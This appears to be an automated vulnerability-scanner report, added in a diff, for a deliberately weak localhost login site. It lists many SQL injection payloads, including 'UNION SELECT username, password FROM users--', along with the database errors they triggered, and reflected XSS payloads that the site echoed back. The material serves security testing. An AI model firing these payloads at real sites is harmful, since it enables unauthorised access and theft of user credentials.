@@ -1,0 +1,183 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title> Scan Report - http://localhost/testwebsite/vulnauth/login.php</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    body{font-family:Inter,Segoe UI,Roboto,Arial,sans-serif;margin:20px;color:#111}
+    h1{font-size:24px;margin-bottom:0.2em}
+    .muted{color:#555;font-size:0.95em}
+    .card{border-radius:8px;padding:12px;margin:12px 0;box-shadow:0 2px 6px rgba(0,0,0,0.06);background:#fff}
+    table{border-collapse:collapse;width:100%}th,td{padding:8px;border-bottom:1px solid #eee;text-align:left}th{background:#f7f7f7}pre{background:#f6f8fa;padding:10px;border-radius:6px;overflow:auto}
+  </style>
+</head>
+<body>
+<h1>Scan Report</h1>
+<div class="muted">Target: http://localhost/testwebsite/vulnauth/login.php — Generated: 20251125T062209Z UTC</div>
+<div class="card">
+<strong>Summary</strong>
+<ul>
+<li>Pages crawled: 3</li>
+<li>Found paths: 0</li>
+<li>Form issues: 10</li>
+<li>Potential SQLi findings: 94</li>
+<li>Potential XSS findings: 18</li>
+</ul>
+</div>
+<div class="card">
+<h2>Server & Headers</h2>
+<pre>
+{'server': 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30', 'security_headers': {'X-Frame-Options': None, 'Content-Security-Policy': None, 'X-Content-Type-Options': None, 'Strict-Transport-Security': None}}
+</pre>
+</div>
+<div class="card">
+<h2>Found Paths</h2>
+<table><thead><tr><th>Path</th><th>Status</th></tr></thead><tbody>
+</tbody></table>
+</div>
+<div class="card">
+<h2>Form Issues</h2>
+<table><thead><tr><th>URL</th><th>Action</th><th>Method</th><th>Note</th></tr></thead><tbody>
+<tr><td>http://localhost/testwebsite/vulnauth/login.php</td><td>http://localhost/testwebsite/vulnauth/login.php</td><td>post</td><td>Form action not HTTPS</td></tr>
+<tr><td>http://localhost/testwebsite/vulnauth/login.php</td><td>http://localhost/testwebsite/vulnauth/login.php</td><td>post</td><td>No CSRF-like field (heuristic)</td></tr>
+<tr><td>http://localhost/testwebsite/vulnauth/register.php</td><td>http://localhost/testwebsite/vulnauth/register.php</td><td>post</td><td>Form action not HTTPS</td></tr>
+<tr><td>http://localhost/testwebsite/vulnauth/register.php</td><td>http://localhost/testwebsite/vulnauth/register.php</td><td>post</td><td>No CSRF-like field (heuristic)</td></tr>
+<tr><td>http://localhost/testwebsite/vulnauth/welcome.php</td><td>http://localhost/testwebsite/vulnauth/welcome.php</td><td>get</td><td>Form action not HTTPS</td></tr>
+<tr><td>http://localhost/testwebsite/vulnauth/welcome.php</td><td>http://localhost/testwebsite/vulnauth/welcome.php</td><td>get</td><td>No CSRF-like field (heuristic)</td></tr>
+<tr><td>http://localhost/testwebsite/vulnauth/welcome.php</td><td>http://localhost/testwebsite/vulnauth/welcome.php</td><td>get</td><td>Form action not HTTPS</td></tr>
+<tr><td>http://localhost/testwebsite/vulnauth/welcome.php</td><td>http://localhost/testwebsite/vulnauth/welcome.php</td><td>get</td><td>No CSRF-like field (heuristic)</td></tr>
+<tr><td>http://localhost/testwebsite/vulnauth/welcome.php</td><td>http://localhost/testwebsite/vulnauth/welcome.php</td><td>post</td><td>Form action not HTTPS</td></tr>
+<tr><td>http://localhost/testwebsite/vulnauth/welcome.php</td><td>http://localhost/testwebsite/vulnauth/welcome.php</td><td>post</td><td>No CSRF-like field (heuristic)</td></tr>
+</tbody></table>
+</div>
+<div class="card">
+<h2>Potential SQL Injection Findings</h2>
+<ul>
+<li><b>(n/a)</b> = \ → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = \ → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = \ → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27;)-- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = &#x27;)-- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = &#x27;)-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; OR &#x27;1&#x27;=&#x27;1 → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; OR &#x27;1&#x27;=&#x27;1 → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; OR 1=1-- → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; OR 1=1-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27;)) OR 1=1-- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = &#x27;)) OR 1=1-- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = &#x27;)) OR 1=1-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = admin&#x27; -- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = admin&#x27; -- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = admin&#x27; -- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = admin&#x27;/* → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = admin&#x27;/* → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = admin&#x27;/* → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 1-- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 1-- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 1-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 2-- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 2-- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 2-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 3-- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 3-- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 3-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = -1&#x27; UNION SELECT 1,2,3-- → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = -1&#x27; UNION SELECT 1,2,3-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT NULL-- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statemen</li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT NULL-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT username, password FROM users-- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT username, password FROM users-- → post_sql_error @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT username, password FROM users-- → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT username, password FROM users-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = 1&#x27; OR &#x27;a&#x27;=&#x27;a → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = 1&#x27; OR &#x27;a&#x27;=&#x27;a → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/login.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[21S01]: Insert value list does not match column list: 1136 C</li>
+<li><b>(n/a)</b> = &#x27; → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = \ → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = \ → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = \ → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = \&#x27; → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry</li>
+<li><b>(n/a)</b> = \&#x27; → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27;)-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = &#x27;)-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = &#x27;)-- → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27;)-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; OR 1=1-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[21S01]: Insert value list does not match column list: 1136 C</li>
+<li><b>(n/a)</b> = &#x27; OR 1=1-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27;)) OR 1=1-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = &#x27;)) OR 1=1-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = &#x27;)) OR 1=1-- → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27;)) OR 1=1-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = admin&#x27; -- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = admin&#x27; -- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = admin&#x27; -- → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = admin&#x27; -- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = admin&#x27;# → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = admin&#x27;# → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = admin&#x27;# → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = admin&#x27;/* → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = admin&#x27;/* → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = admin&#x27;/* → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = admin&#x27;/* → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 1-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 1-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 1-- → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 1-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 2-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 2-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 2-- → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 2-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 3-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 3-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 3-- → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = 1&#x27; ORDER BY 3-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = -1&#x27; UNION SELECT 1,2,3-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = -1&#x27; UNION SELECT 1,2,3-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = -1&#x27; UNION SELECT 1,2,3-- → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = -1&#x27; UNION SELECT 1,2,3-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT NULL-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT NULL-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT NULL-- → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT NULL-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT username, password FROM users-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that </li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT username, password FROM users-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e</li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT username, password FROM users-- → post_sql_length_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; UNION SELECT username, password FROM users-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = &#x27; AND SLEEP(5)-- → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[21S01]: Insert value list does not match column list: 1136 C</li>
+<li><b>(n/a)</b> = &#x27; AND SLEEP(5)-- → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+<li><b>(n/a)</b> = 1&#x27; OR &#x27;a&#x27;=&#x27;a → post_sql_error @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: &lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry</li>
+<li><b>(n/a)</b> = 1&#x27; OR &#x27;a&#x27;=&#x27;a → post_sql_dom_diff @ http://localhost/testwebsite/vulnauth/register.php<br/>Evidence: (none)</li>
+</ul>
+</div>
+<div class="card">
+<h2>Potential XSS Findings</h2>
+<ul>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><script>alert(1)</script> - param: x - payload: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;&lt;ul</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><img src=x onerror=alert(1)> - param: x - payload: &quot;&gt;&lt;img src=x onerror=alert(1)&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><svg/onload=alert(1)> - param: x - payload: &quot;&gt;&lt;svg/onload=alert(1)&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;svg/onload=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;&lt;ul&gt;&lt;li</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><iframe/src=javascript:alert(1)> - param: x - payload: &quot;&gt;&lt;iframe/src=javascript:alert(1)&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;iframe/src=javascript:alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><body onload=alert(1)> - param: x - payload: &quot;&gt;&lt;body onload=alert(1)&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;body onload=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;&lt;ul&gt;&lt;l</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><script>confirm(1)</script> - param: x - payload: &quot;&gt;&lt;script&gt;confirm(1)&lt;/script&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;script&gt;confirm(1)&lt;/script&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;&lt;</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><script>prompt(1)</script> - param: x - payload: &quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;&lt;u</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><scr<script>ipt>alert(1)</scr<script>ipt> - param: x - payload: &quot;&gt;&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;&lt;/p&gt;&lt;h3&gt;Stored Us</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><img src=x onerror="this.src='x';alert(1)"> - param: x - payload: &quot;&gt;&lt;img src=x onerror=&quot;this.src=&#x27;x&#x27;;alert(1)&quot;&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;img src=x onerror=&quot;this.src=&#x27;x&#x27;;alert(1)&quot;&gt;&lt;/p&gt;&lt;h3&gt;Stored </li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x=<script>alert(document.domain)</script> - param: x - payload: &lt;script&gt;alert(document.domain)&lt;/script&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/p&gt;&lt;h3&gt;Stored Userna</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><svg><script>alert(1)</script> - param: x - payload: &quot;&gt;&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h</li>
